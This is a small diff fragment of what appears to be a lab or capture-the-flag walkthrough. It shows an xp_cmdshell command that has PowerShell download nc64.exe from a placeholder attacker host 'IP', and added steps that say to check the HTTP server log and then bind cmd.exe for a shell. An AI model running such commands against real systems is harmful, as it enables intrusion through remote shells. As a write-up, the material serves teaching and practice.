@@ -114,7 +114,9 @@ In the current directory sql_svc does not have permission to execute things.
 SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://IP/nc64.exe -outfile nc64.exe"
 ```
 
+Verify if  the simple Python HTTP server recibed the request
 
+Now bind the `cmd.exe`
 
 
 
